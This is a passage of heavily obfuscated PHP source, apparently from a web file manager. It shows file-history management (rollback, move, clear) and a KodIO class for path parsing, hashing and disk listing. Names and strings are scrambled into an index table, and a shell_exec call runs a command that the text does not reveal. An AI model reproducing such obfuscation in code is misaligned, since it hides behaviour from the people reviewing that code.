(!$§èÀåÄ¿) { return !1; } foreach ($§èÀåÄ¿[$‡¹Ïªİä[415]] as $ª…–­»ò) { if ($ª…–­»ò[$‡¹Ïªİä[445]] == $¢ƒ¶×æÊ) { IO::remove($§èÀåÄ¿[$‡¹Ïªİä[1291]] . $ª…–­»ò[$‡¹Ïªİä[32]]); continue; } $÷“•Ü†[] = $ª…–­»ò; } return self::saveData($§èÀåÄ¿[$‡¹Ïªİä[1292]], $÷“•Ü†); } public static function clear($ËĞıÁÈ, $„«¦ÄıÜ = true) { $æ©¹ãó =& $_SERVER[èùÙ¹Ïö]; $Úùµ³Ğû = self::listData($ËĞıÁÈ, $„«¦ÄıÜ); if (!$Úùµ³Ğû) { return !1; } foreach ($Úùµ³Ğû[$æ©¹ãó[415]] as $ƒ‰®âœ¸) { IO::remove($Úùµ³Ğû[$æ©¹ãó[1291]] . $ƒ‰®âœ¸[$æ©¹ãó[32]]); } return self::saveData($Úùµ³Ğû[$æ©¹ãó[1292]], array()); } public static function moveHistory($³±àıÕ¿, $üÄ¨öí° = '', $³®ÁÜ´æ = '') { $’¨Û½ƒ =& $_SERVER[èùÙ¹Ïö]; $ıÍ¸Êï¡ = self::listData($³±àıÕ¿, !1); if (!$ıÍ¸Êï¡ || !$ıÍ¸Êï¡[$’¨Û½ƒ[415]]) { return !1; } $¸äòä¦¯ = $’¨Û½ƒ[1279]; $üÄ¨öí° = $üÄ¨öí° ? $üÄ¨öí° : get_path_this($³±àıÕ¿); $³®ÁÜ´æ = $³®ÁÜ´æ ? $³®ÁÜ´æ : $ıÍ¸Êï¡[$’¨Û½ƒ[1291]]; $Ñ»ÏŞ“Å = substr(get_path_this($ıÍ¸Êï¡[$’¨Û½ƒ[1292]]), 0, -strlen($¸äòä¦¯)); foreach ($ıÍ¸Êï¡[$’¨Û½ƒ[415]] as $¯ÕÎ†¹Ô => $‰™£šÙö) { $­ì±Œ¹‰ = $üÄ¨öí° . substr($‰™£šÙö[$’¨Û½ƒ[32]], strlen($Ñ»ÏŞ“Å)); $¼¼éÇî‚ = IO::move($ıÍ¸Êï¡[$’¨Û½ƒ[1291]] . $‰™£šÙö[$’¨Û½ƒ[32]], $³®ÁÜ´æ, !1, $­ì±Œ¹‰); if ($¼¼éÇî‚) { $ıÍ¸Êï¡[$’¨Û½ƒ[415]][$¯ÕÎ†¹Ô][$’¨Û½ƒ[32]] = $­ì±Œ¹‰; } } $ıÍ¸Êï¡[$’¨Û½ƒ[1292]] = IO::move($ıÍ¸Êï¡[$’¨Û½ƒ[1292]], $³®ÁÜ´æ, !1, $üÄ¨öí° . $¸äòä¦¯); self::saveData($ıÍ¸Êï¡[$’¨Û½ƒ[1292]], $ıÍ¸Êï¡[$’¨Û½ƒ[415]]); self::clearEmptyFolder($ıÍ¸Êï¡[$’¨Û½ƒ[1291]]); } public static function rollback($øãÎ’», $Æä±êÈ§) { $ó²ƒ·‚æ =& $_SERVER[èùÙ¹Ïö]; $¨ˆñ…Ñ = self::listData($øãÎ’»); if (!$¨ˆñ…Ñ) { return; } $×‘Ö¶·Ÿ = IO::info($øãÎ’»); foreach ($¨ˆñ…Ñ[$ó²ƒ·‚æ[415]] as $áËÏ°åÔ => $»ƒíÍ¡ñ) { if ($»ƒíÍ¡ñ[$ó²ƒ·‚æ[445]] == $Æä±êÈ§) { self::add($øãÎ’»); $ĞØ†Ñ˜  = $¨ˆñ…Ñ[$ó²ƒ·‚æ[1291]] . $»ƒíÍ¡ñ[$ó²ƒ·‚æ[32]]; $—ÄÂÖØ“ = IO::copy($ĞØ†Ñ˜ , IO::pathFather($øãÎ’»), REPEAT_REPLACE, $×‘Ö¶·Ÿ[$ó²ƒ·‚æ[32]]); if ($—ÄÂÖØ“) { self::remove($øãÎ’», $Æä±êÈ§); } return $—ÄÂÖØ“; } } return !1; } public static function setDetail($®£‘À³ï, $øÌµü·, $á¤˜Ş³ä) { $÷Á³î±â =& $_SERVER[èùÙ¹Ïö]; $é ƒœúÇ = self::listData($®£‘À³ï); if (!$é ƒœúÇ) { return; } foreach ($é ƒœúÇ[$÷Á³î±â[415]] as $§³§ÁßÉ => $´Üõæà) { if ($´Üõæà[$÷Á³î±â[445]] == $øÌµü·) { $é ƒœúÇ[$÷Á³î±â[415]][$§³§ÁßÉ][$÷Á³î±â[1290]] = $á¤˜Ş³ä; self::saveData($é ƒœúÇ[$÷Á³î±â[1292]], $é ƒœúÇ[$÷Á³î±â[415]]); return !0; } } return !1; } public static function fileInfo($öª®Œ²è, $¯¸ÏÙ¸•) { $ô•Ëñ· =& $_SERVER[èùÙ¹Ïö]; $ƒ¸Â”©Ş = self::listData($öª®Œ²è); if (!$ƒ¸Â”©Ş) { show_json(LNG($ô•Ëñ·[107]), !1); } $ÑÆÊï˜ = $ô•Ëñ·[12]; foreach ($ƒ¸Â”©Ş[$ô•Ëñ·[415]] as $üÏœÑ¿È => $ûèªÒáâ) { if ($ûèªÒáâ[$ô•Ëñ·[445]] != $¯¸ÏÙ¸•) { continue; } $ÑÆÊï˜ = $ƒ¸Â”©Ş[$ô•Ëñ·[1291]] . $ûèªÒáâ[$ô•Ëñ·[32]]; break; } if (!$ÑÆÊï˜) { show_json(LNG($ô•Ëñ·[107]), !1); } return IO::info($ÑÆÊï˜); } public static function fileOut($¦Ó¦¸›õ, $äŒÚˆ³¬, $‰Ú™¡‡ò = false) { $…’ ‰À =& $_SERVER[èùÙ¹Ïö]; $¶ğ·Ÿ£ = self::fileInfo($¦Ó¦¸›õ, $äŒÚˆ³¬); $˜›Èô·‹ =& $GLOBALS[$…’ ‰À[7]]; $‰Ú™¡‡ò = isset($˜›Èô·‹[$…’ ‰À[1242]]) && $˜›Èô·‹[$…’ ‰À[1242]] == 1; if (isset($˜›Èô·‹[$…’ ‰À[33]]) && $˜›Èô·‹[$…’ ‰À[33]] == $…’ ‰À[1293]) { return IO::fileOutImage($¶ğ·Ÿ£[$…’ ‰À[86]], $˜›Èô·‹[$…’ ‰À[1294]]); } IO::fileOut($¶ğ·Ÿ£[$…’ ‰À[86]], $‰Ú™¡‡ò, get_path_this($¦Ó¦¸›õ)); } public static function listData($³´ŸñÉû, $…§‘èö³ = true) { $ÏÇ”ìÏŒ =& $_SERVER[èùÙ¹Ïö]; if ($…§‘èö³ && !IO::exist($³´ŸñÉû)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($³´ŸñÉû, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ƒƒ‚Áª = self::pathHistory($³´ŸñÉû); $­ŠÆ±¾ = array($ÏÇ”ìÏŒ[1292] => $ƒƒ‚Áª . $ÏÇ”ìÏŒ[1279], $ÏÇ”ìÏŒ[1291] => rtrim(get_path_father($ƒƒ‚Áª), $ÏÇ”ìÏŒ[8]) . $ÏÇ”ìÏŒ[8], $ÏÇ”ìÏŒ[415] => array()); $•òÅùŠ = IO::getContent($­ŠÆ±¾[$ÏÇ”ìÏŒ[1292]]); if ($•òÅùŠ) { $´ÈğñŸ = json_decode($•òÅùŠ, !0); if (is_array($´ÈğñŸ)) { $­ŠÆ±¾[$ÏÇ”ìÏŒ[415]] = $´ÈğñŸ; } } return $­ŠÆ±¾; } private static function saveData($µŒİµÈ©, $ÆÇ¤•²) { $»óÖ¿ÜÊ =& $_SERVER[èùÙ¹Ïö]; self::log($»óÖ¿ÜÊ[1295] . $µŒİµÈ© . $»óÖ¿ÜÊ[73] . count($ÆÇ¤•²), $»óÖ¿ÜÊ[791]); if ($ÆÇ¤•²) { return IO::setContent($µŒİµÈ©, json_encode($ÆÇ¤•²)); } $…ÊÎçÓ = IO::pathFather($µŒİµÈ©); IO::remove($µŒİµÈ©); self::clearEmptyFolder($…ÊÎçÓ); return !0; } public static function clearEmptyFolder($öüË—©Ñ) { $ğÙ‰×Õ =& $_SERVER[èùÙ¹Ïö]; if (trim($öüË—©Ñ, $ğÙ‰×Õ[8]) == trim(self::$_historyBase, $ğÙ‰×Õ[8])) { return; } $ÚÍ¥¼‰ = IO::pathFather($öüË—©Ñ); $Ï‡ñÊ€ = IO::has($öüË—©Ñ, !0); if ($Ï‡ñÊ€[$ğÙ‰×Õ[225]] > 0 || $Ï‡ñÊ€[$ğÙ‰×Õ[226]] > 0) { return; } IO::remove($öüË—©Ñ); self::clearEmptyFolder($ÚÍ¥¼‰); } private static function getBasePath() { $¤éçŠê¹ =& $_SERVER[èùÙ¹Ïö]; $±™ã·¿ = Model($¤éçŠê¹[1296])->get($¤éçŠê¹[1297]); if ($±™ã·¿) { if (!IO::exist($±™ã·¿)) { IO::mkdir($±™ã·¿); } if (get_path_this($±™ã·¿) == $¤éçŠê¹[1282]) { $³Çö™ïÜ = $¤éçŠê¹[1298] . rand_string(8); @rename($±™ã·¿, get_path_father($±™ã·¿) . $¤éçŠê¹[8] . $³Çö™ïÜ); $±™ã·¿ = DATA_PATH . $³Çö™ïÜ . $¤éçŠê¹[8]; file_put_contents(DATA_PATH . $¤éçŠê¹[1232], $¤éçŠê¹[12]); Model($¤éçŠê¹[1296])->set($¤éçŠê¹[1297], $±™ã·¿); } return $±™ã·¿; } $±™ã·¿ = DATA_PATH . $¤éçŠê¹[1298] . rand_string(8) . $¤éçŠê¹[8]; $±™ã·¿ = IO::mkdir($±™ã·¿); $±™ã·¿ = rtrim($±™ã·¿, $¤éçŠê¹[8]) . $¤éçŠê¹[8]; file_put_contents($±™ã·¿ . $¤éçŠê¹[1232], $¤éçŠê¹[12]); file_put_contents(DATA_PATH . $¤éçŠê¹[1232], $¤éçŠê¹[12]); Model($¤éçŠê¹[1296])->set($¤éçŠê¹[1297], $±™ã·¿); return $±™ã·¿; } } goto CÕ•ç½Õ»æ; CÕ•ç½Õ»æ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\122\145\143\x79\143\154\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\x69\154\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\x72\x46\151\154\145\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\122\x6f\157\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\x53\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\x68\x61\x72\145\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\145\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\164\x65\x6d\114\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\x68\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\153\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\x52\x65\x6e\143\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\166\145\x72\x7d"; public static function typeList() { $Ê±ÕƒîË =& $_SERVER[èùÙ¹Ïö]; return array($Ê±ÕƒîË[1299] => self::KOD_SOURCE, $Ê±ÕƒîË[1300] => self::KOD_USER_RECYCLE, $Ê±ÕƒîË[1301] => self::KOD_USER_FAV, $Ê±ÕƒîË[1302] => self::KOD_USER_FILE_TAG, $Ê±ÕƒîË[1303] => self::KOD_USER_FILE_TYPE, $Ê±ÕƒîË[1304] => self::KOD_GROUP_ROOT_SELF, $Ê±ÕƒîË[1305] => self::KOD_USER_SHARE, $Ê±ÕƒîË[1306] => self::KOD_USER_SHARE_LINK, $Ê±ÕƒîË[1307] => self::KOD_USER_SHARE_TO_ME, $Ê±ÕƒîË[1308] => self::KOD_SHARE_ITEM, $Ê±ÕƒîË[1309] => self::KOD_SHARE_LINK, $Ê±ÕƒîË[1310] => self::KOD_SEARCH, $Ê±ÕƒîË[1311] => self::KOD_BLOCK, $Ê±ÕƒîË[1312] => self::KOD_IO, $Ê±ÕƒîË[1313] => self::KOD_USER_RECENT, $Ê±ÕƒîË[1314] => self::KOD_USER_DRIVER); } public static function parse($æò™ï”Ó) { $Ûõ°¹ò” =& $_SERVER[èùÙ¹Ïö]; $æò™ï”Ó = self::clear($æò™ï”Ó); $Š»ä–ñ« = array_values(self::typeList()); preg_match($Ûõ°¹ò”[1315], $æò™ï”Ó, $ ß×¯¢); $²²é“Àô = array($Ûõ°¹ò”[466] => !1, $Ûõ°¹ò”[1316] => !1, $Ûõ°¹ò”[463] => !1, $Ûõ°¹ò”[86] => $æò™ï”Ó, $Ûõ°¹ò”[1217] => !1, $Ûõ°¹ò”[1216] => $Ûõ°¹ò”[12]); if (is_array($ ß×¯¢) && count($ ß×¯¢) == 5) { $Ò¾æ¹® = $Ûõ°¹ò”[1317] . $ ß×¯¢[2] . $Ûõ°¹ò”[373]; if (in_array($Ò¾æ¹®, $Š»ä–ñ«)) { $²²é“Àô[$Ûõ°¹ò”[1217]] = $ ß×¯¢[1]; $²²é“Àô[$Ûõ°¹ò”[33]] = $Ò¾æ¹®; $²²é“Àô[$Ûõ°¹ò”[1318]] = substr($Ò¾æ¹®, 1, -1); $²²é“Àô[$Ûõ°¹ò”[445]] = $ ß×¯¢[3]; } $²²é“Àô[$Ûõ°¹ò”[1216]] = $ ß×¯¢[4]; } $æÆÓØ§Š = array($Ûõ°¹ò”[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $²²é“Àô[$Ûõ°¹ò”[1281]] = in_array($²²é“Àô[$Ûõ°¹ò”[33]], $æÆÓØ§Š); return $²²é“Àô; } public static function isTruePath($ªíßîµË) { $Øƒæµùà =& $_SERVER[èùÙ¹Ïö]; if (substr($ªíßîµË, 0, 1) != $Øƒæµùà[1317]) { return !0; } if (strpos($ªíßîµË, $Øƒæµùà[453]) === 0) { return !0; } if (strpos($ªíßîµË, $Øƒæµùà[1285]) === 0) { return !0; } if (strpos($ªíßîµË, $Øƒæµùà[1319]) === 0) { return !0; } if (strpos($ªíßîµË, $Øƒæµùà[1320]) === 0) { return !0; } if (strpos($ªíßîµË, $Øƒæµùà[1321]) === 0) { return !0; } return !1; } public static function clear($‡¨ĞÎè¶) { $ÊµŠÀÃ… =& $_SERVER[èùÙ¹Ïö]; $‡¨ĞÎè¶ = str_replace(array($ÊµŠÀÃ…[1124], $ÊµŠÀÃ…[248]), $ÊµŠÀÃ…[53], $‡¨ĞÎè¶); $‡¨ĞÎè¶ = str_replace($ÊµŠÀÃ…[99], $ÊµŠÀÃ…[8], $‡¨ĞÎè¶); $ÇáôŠéŠ = $ÊµŠÀÃ…[1322]; if (substr($‡¨ĞÎè¶, 0, 3) == $ÊµŠÀÃ…[1323]) { $‡¨ĞÎè¶ = substr($‡¨ĞÎè¶, 3); } while (strstr($‡¨ĞÎè¶, $ÇáôŠéŠ)) { $‡¨ĞÎè¶ = str_replace($ÇáôŠéŠ, $ÊµŠÀÃ…[8], $‡¨ĞÎè¶); } $‡¨ĞÎè¶ = preg_replace($ÊµŠÀÃ…[1324], $ÊµŠÀÃ…[8], $‡¨ĞÎè¶); if ($‡¨ĞÎè¶ == $ÊµŠÀÃ…[8]) { return $ÊµŠÀÃ…[8]; } $‡¨ĞÎè¶ = rtrim($‡¨ĞÎè¶, $ÊµŠÀÃ…[8]); return $‡¨ĞÎè¶; } public static function pathTrue($Ê¼àÌÆ‘) { $ÎÚ¯µ˜ˆ =& $_SERVER[èùÙ¹Ïö]; if (!$Ê¼àÌÆ‘) { return $ÎÚ¯µ˜ˆ[12]; } $Ê¼àÌÆ‘ = str_replace($ÎÚ¯µ˜ˆ[564], $ÎÚ¯µ˜ˆ[8], str_replace($ÎÚ¯µ˜ˆ[1325], $ÎÚ¯µ˜ˆ[8], $Ê¼àÌÆ‘)); $Ê¼àÌÆ‘ = str_replace($ÎÚ¯µ˜ˆ[564], $ÎÚ¯µ˜ˆ[8], str_replace($ÎÚ¯µ˜ˆ[1325], $ÎÚ¯µ˜ˆ[8], $Ê¼àÌÆ‘)); if (!strstr($Ê¼àÌÆ‘, $ÎÚ¯µ˜ˆ[1323])) { return $Ê¼àÌÆ‘; } $òŒ‰½à = explode($ÎÚ¯µ˜ˆ[8], $Ê¼àÌÆ‘); foreach ($òŒ‰½à as $ìÜ¼îÎ¿ => $Ó„şöŞô) { if ($Ó„şöŞô !== $ÎÚ¯µ˜ˆ[1326]) { continue; } for ($ùÅò©”¼ = $ìÜ¼îÎ¿; $ùÅò©”¼ >= 0; $ùÅò©”¼--) { if ($òŒ‰½à[$ùÅò©”¼] === $ÎÚ¯µ˜ˆ[10] || $òŒ‰½à[$ùÅò©”¼] === $ÎÚ¯µ˜ˆ[1326] || $òŒ‰½à[$ùÅò©”¼] === -1) { continue; } if ($òŒ‰½à[$ùÅò©”¼] === $ÎÚ¯µ˜ˆ[12]) { $òŒ‰½à[$ìÜ¼îÎ¿] = -1; break; } $òŒ‰½à[$ìÜ¼îÎ¿] = -1; $òŒ‰½à[$ùÅò©”¼] = -1; break; } } $å¥ã€û = array(); foreach ($òŒ‰½à as $Ó„şöŞô) { if ($Ó„şöŞô !== -1) { $å¥ã€û[] = $Ó„şöŞô; } } $Ğñïç› = implode($ÎÚ¯µ˜ˆ[8], $å¥ã€û); if (strpos($Ğñïç›, $ÎÚ¯µ˜ˆ[1327]) === 0) { $Ğñïç› = $ÎÚ¯µ˜ˆ[1323] . substr($Ğñïç›, strlen($ÎÚ¯µ˜ˆ[1327])); } return $Ğñïç›; } public static function sourceID($úïùŠ¦) { $ßÕ¡…ğÈ =& $_SERVER[èùÙ¹Ïö]; $íéûşÃ¼ = self::parse($úïùŠ¦); if ($íéûşÃ¼[$ßÕ¡…ğÈ[33]] !== self::KOD_SOURCE) { show_json(LNG($ßÕ¡…ğÈ[1328]), !1); } return $íéûşÃ¼[$ßÕ¡…ğÈ[445]]; } public static function make($ÜÜ²–§Ğ) { if (!$ÜÜ²–§Ğ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÜÜ²–§Ğ)); } public static function makeShare($û¹ŒŒ‹, $Î‡óÒ¢º) { return self::makePath(self::KOD_SHARE_ITEM, $û¹ŒŒ‹, $Î‡óÒ¢º); } public static function makeFileTypePath($Ë¢«Øóã) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ë¢«Øóã); } public static function makeFileTagPath($ØİÁÔà) { return self::makePath(self::KOD_USER_FILE_TAG, $ØİÁÔà); } public static function makePath($±®§ÆğÑ, $Ï¾ì¤«ã = '', $ë¬Œ¥Æ = '') { $íúÑ”µç =& $_SERVER[èùÙ¹Ïö]; $—ì˜ü = substr($±®§ÆğÑ, 1, -1); $à Ğ»…È = $íúÑ”µç[1329] . $—ì˜ü . $íúÑ”µç[1330] . $Ï¾ì¤«ã . $íúÑ”µç[1331]; $à Ğ»…È = $ë¬Œ¥Æ ? $à Ğ»…È . $ë¬Œ¥Æ . $íúÑ”µç[8] : $à Ğ»…È; return $à Ğ»…È; } public static function hashPath($ô‹£¬¼ , $æÁÑÉ·ò = true) { $¹ªºš =& $_SERVER[èùÙ¹Ïö]; $©¬¶äˆ¹ = is_array($ô‹£¬¼ ) ? $ô‹£¬¼  : IO::info($ô‹£¬¼ ); $Ö®–à­à = _get($©¬¶äˆ¹, $¹ªºš[1332], $¹ªºš[12]); if (!$Ö®–à­à && isset($©¬¶äˆ¹[$¹ªºš[221]])) { $Ö®–à­à = trim($©¬¶äˆ¹[$¹ªºš[221]], $¹ªºš[120]); } if (!$Ö®–à­à && isset($©¬¶äˆ¹[$¹ªºš[183]]) && $©¬¶äˆ¹[$¹ªºš[183]]) { $©¬¶äˆ¹ = IO::info(KodIO::make($©¬¶äˆ¹[$¹ªºš[183]])); $Ö®–à­à = _get($©¬¶äˆ¹, $¹ªºš[1332], $¹ªºš[12]); } $˜Î˜• = md5($©¬¶äˆ¹[$¹ªºš[86]] . $©¬¶äˆ¹[$¹ªºš[78]] . $©¬¶äˆ¹[$¹ªºš[87]]); if (!$Ö®–à­à && file_exists($©¬¶äˆ¹[$¹ªºš[86]])) { $Ö®–à­à = Cache::get($˜Î˜• . $¹ªºš[1333]); $Ö®–à­à = !1; if (!$Ö®–à­à) { $Ö®–à­à = IO::hashSimple($©¬¶äˆ¹[$¹ªºš[86]]); Cache::set($˜Î˜• . $¹ªºš[1333], $Ö®–à­à, 3600 * 24 * 30); } } if ($æÁÑÉ·ò && !$Ö®–à­à) { } return $Ö®–à­à ? $Ö®–à­à : $˜Î˜•; } public static function hashPathSafe($şô€¸¦©, $¬É‡½™î = true) { $í²ü€¡¡ =& $_SERVER[èùÙ¹Ïö]; $Ñ¤³Œëî = self::hashPath($şô€¸¦©, $¬É‡½™î); return md5($Ñ¤³Œëî . $í²ü€¡¡[1334] . Model($í²ü€¡¡[810])->get($í²ü€¡¡[811])); } public static function initSystemPath() { $Œë¸½Òõ =& $_SERVER[èùÙ¹Ïö]; if (defined($Œë¸½Òõ[1335])) { return; } define($Œë¸½Òõ[1335], self::systemPath($Œë¸½Òõ[181])); define($Œë¸½Òõ[1336], self::systemPath($Œë¸½Òõ[1337])); define($Œë¸½Òõ[1338], self::systemPath($Œë¸½Òõ[1339])); define($Œë¸½Òõ[1340], self::systemPath($Œë¸½Òõ[1341])); IOHistory::bindEvent(); } public static function systemPath($è†¼¥İØ) { $ë“¾§¶Ş =& $_SERVER[èùÙ¹Ïö]; $›”æ”Ì = $ë“¾§¶Ş[1342] . ucfirst($è†¼¥İØ); $÷•®˜¡ = Model($ë“¾§¶Ş[810])->get($›”æ”Ì); if ($÷•®˜¡) { return $÷•®˜¡; } if ($è†¼¥İØ == $ë“¾§¶Ş[181]) { $÷•®˜¡ = self::make(Model($ë“¾§¶Ş[865])->systemRootPathAdd($ë“¾§¶Ş[577])); } else { $÷•®˜¡ = self::systemPath($ë“¾§¶Ş[181]); $Ö„ìÕ¤ = self::sourceID($÷•®˜¡); $÷•®˜¡ = self::make(Model($ë“¾§¶Ş[865])->mkdir($Ö„ìÕ¤, $è†¼¥İØ)); } Model($ë“¾§¶Ş[810])->set($›”æ”Ì, $÷•®˜¡); return $÷•®˜¡; } public static function systemFolder($Ë¢Àáè) { $çÛÃ¼Ã¢ = IO_PATH_SYSTEM_SOURCE . $Ë¢Àáè; $ş°¼ÍÖ– = Cache::get($çÛÃ¼Ã¢); if (!$ş°¼ÍÖ–) { $³ëÀº· = IO::infoFullSimple($çÛÃ¼Ã¢); if (!$³ëÀº·) { $ş°¼ÍÖ– = IO::mkdir($çÛÃ¼Ã¢, REPEAT_SKIP); } else { $ş°¼ÍÖ– = $³ëÀº·[$_SERVER[èùÙ¹Ïö][86]]; } Cache::set($çÛÃ¼Ã¢, $ş°¼ÍÖ–, 3600 * 10); } return $ş°¼ÍÖ–; } public static function defaultDriver() { return Model($_SERVER[èùÙ¹Ïö][807])->defaultDriver(); } public static function defaultIO() { $ª‘ÍÎì‹ =& $_SERVER[èùÙ¹Ïö]; $´Ï‡ÇäŸ = self::defaultDriver(); return $ª‘ÍÎì‹[1343] . $´Ï‡ÇäŸ[$ª‘ÍÎì‹[445]] . $ª‘ÍÎì‹[1331]; } public static function defaultDriverInit() { static $šˆÌ¥Ñ = false; if ($šˆÌ¥Ñ) { return $šˆÌ¥Ñ; } $šˆÌ¥Ñ = IO::init(self::defaultIO()); return $šˆÌ¥Ñ; } public static function fileTypeList() { $å§ñ»™· =& $_SERVER[èùÙ¹Ïö]; $ª½ÆÀø = $GLOBALS[$å§ñ»™·[6]][$å§ñ»™·[1344]]; foreach ($ª½ÆÀø as $£ ¨çƒ => $Ï¥µÁƒ¡) { $İ…‚åù¯ = $å§ñ»™·[1345] . $£ ¨çƒ; $Îİ¤šÒ = LNG($İ…‚åù¯); if ($İ…‚åù¯ != $Îİ¤šÒ) { $ª½ÆÀø[$£ ¨çƒ][$å§ñ»™·[32]] = $Îİ¤šÒ; } } return $ª½ÆÀø; } public static function diskList($¡ïç…± = true) { $ğ«ÅôÃ÷ = $_SERVER[èùÙ¹Ïö][1346]; if ($¡ïç…±) { $×’ãëô = Cache::get($ğ«ÅôÃ÷); if (is_array($×’ãëô)) { return $×’ãëô; } } $×’ãëô = self::diskListGet(); Cache::set($ğ«ÅôÃ÷, $×’ãëô, 60); return $×’ãëô; } public static function diskListGet() { $¾·×»ÎÄ =& $_SERVER[èùÙ¹Ïö]; $†éÚÚš = array(); if ($GLOBALS[$¾·×»ÎÄ[6]][$¾·×»ÎÄ[1347]] == $¾·×»ÎÄ[1348]) { $“¾åØú• = $¾·×»ÎÄ[1349]; for ($¶ûÍÉ£ß = 0; $¶ûÍÉ£ß < strlen($“¾åØú•); $¶ûÍÉ£ß++) { $å²“£¼ = $“¾åØú•[$¶ûÍÉ£ß] . $¾·×»ÎÄ[1350]; if (file_exists($å²“£¼)) { $†éÚÚš[] = $å²“£¼; } } return $†éÚÚš; } if (!function_exists($¾·×»ÎÄ[100])) { $†éÚÚš[] = $¾·×»ÎÄ[876]; return $†éÚÚš; } $ê¥Üà­ = explode($¾·×»ÎÄ[248], shell_exec($¾·×»ÎÄ[1351])); array_shift($ê¥Üà­); array_pop($ê¥Üà­); $øØßğÃ¤ = array($¾·×»ÎÄ[1352], $¾·×»ÎÄ[1353], $¾·×»ÎÄ[1354], $¾·×»ÎÄ[1355], $¾·×»ÎÄ[1356], $¾·×»ÎÄ[1357], $¾·×»ÎÄ[1358], $¾·×»ÎÄ[1359]); foreach ($ê¥Üà­ as $œ¨ˆı­Š) { $Û¿·•©£ = preg_split($¾·×»ÎÄ[1360], $œ¨ˆı­Š); $å²“£¼ = $Û¿·•©£[count($Û¿·•©£) - 1]; if (!strstr($Û¿·•©£[0], $¾·×»ÎÄ[1361]) || !$å²“£¼) { continue; } $õÒ–äßû = rtrim($å²“£¼, $¾·×»ÎÄ[8]) . $¾·×»ÎÄ[8]; if (in_array($õÒ–äßû, $øØßğÃ¤)) { continue; } $†éÚÚš[] = $õÒ–äßû; } return $†éÚÚš; } public static function isSameDisk($«ôàşç£, $Â£–óœ) { $æÛ– ¾ =& $_SERVER[èùÙ¹Ïö]; if ($GLOBALS[$æÛ– ¾[6]][$æÛ– ¾[1347]] == $æÛ– ¾[1348]) { return strtolower(substr($«ôàşç£, 0, 1)) == strtolower(substr($Â£–óœ, 0, 1)); } $’¥ºëõ² = self::diskList(); $áıÛ’­ = !1; $‚²ÆÔÄÒ = !1; sort($’¥ºëõ²); $’¥ºëõ² = array_reverse($’¥ºëõ²); $«ôàşç£ = rtrim($«ôàşç£, $æÛ– ¾[8]) . $æÛ– ¾[8]; $Â£–óœ = rtrim($Â£–óœ, $æÛ– ¾[8]) . $æÛ– ¾[8]; foreach ($’¥ºëõ² as $ÜóÙ¡Åë) { $“ãç…îî = strlen($ÜóÙ¡Åë); if (!$áıÛ’­ && substr($«ôàşç£, 0, $“ãç…îî) == $ÜóÙ¡Åë) { $áıÛ’­ = $ÜóÙ¡Åë; } if (!$‚²ÆÔÄÒ && substr($Â£–óœ, 0, $“ãç…îî) == $ÜóÙ¡Åë) { $‚²ÆÔÄÒ = $ÜóÙ¡Åë; } if ($áıÛ’­ && $‚²ÆÔÄÒ) { break; } } return $áıÛ’­ === $‚²ÆÔÄÒ; } public static function transferType($îù°È£, $ÒÊÃÁâ°) { $ÃìŸâ¨× =& $_SERVER[èùÙ¹Ïö]; $¯§’Ôê = self::driverType($îù°È£); $È¶Ê¶Œ˜ = self::driverType($ÒÊÃÁâ°); if ($¯§’Ôê[$ÃìŸâ¨×[33]] == $È¶Ê¶Œ˜[$ÃìŸâ¨×[33]] && $¯§’Ôê[$ÃìŸâ¨×[1362]] == $È¶Ê¶Œ˜[$ÃìŸâ¨×[1362]]) { return $ÃìŸâ¨×[1363]; } if ($¯§’Ôê[$ÃìŸâ¨×[33]] == $ÃìŸâ¨×[909] && $È¶Ê¶Œ˜[$ÃìŸâ¨×[33]] == $ÃìŸâ¨×[108]) { return $ÃìŸâ¨×[1242]; } if ($¯§’Ôê[$ÃìŸâ¨×[33]] == $ÃìŸâ¨×[108] && $È¶Ê¶Œ˜[$ÃìŸâ¨×[33]] == $ÃìŸâ¨×[909]) { return $ÃìŸâ¨×[109]; } return $ÃìŸâ¨×[1364]; } public static function driverType($ÙäÌ•˜è) { $ÜäÂúêò =& $_SERVER[èùÙ¹Ïö]; $¨šë€¡ = str_replace($ÜäÂúêò[1365], $ÜäÂúêò[12], strtolower($ÙäÌ•˜è->getType())); if ($¨šë€¡ == $ÜäÂúêò[797] || $¨šë€¡ == $ÜäÂúêò[1366] || $¨šë€¡ == $ÜäÂúêò[1367]) { $ÙäÌ•˜è = self::defaultDriverInit(); } else { if ($¨šë€¡ == $ÜäÂúêò[1252] || $¨šë€¡ == $ÜäÂúêò[1368]) { $ÙäÌ•˜è = IO::init($ÙäÌ•˜è->pathParse[$ÜäÂúêò[1199]]); } } $Œ˜„Èõ = $ÙäÌ•˜è->path; $¨šë€¡ = str_replace($ÜäÂúêò[1365], $ÜäÂúêò[12], strtolower($ÙäÌ•˜è->getType())); if ($¨šë€¡ == $ÜäÂúêò[108]) { return array($ÜäÂúêò[33] => $ÜäÂúêò[108], $ÜäÂúêò[1362] => $ÜäÂúêò[12], $ÜäÂúêò[86] => $Œ˜„Èõ, $ÜäÂúêò[97] => $ÙäÌ•˜è); } return array($ÜäÂúêò[33] => $ÜäÂúêò[909], 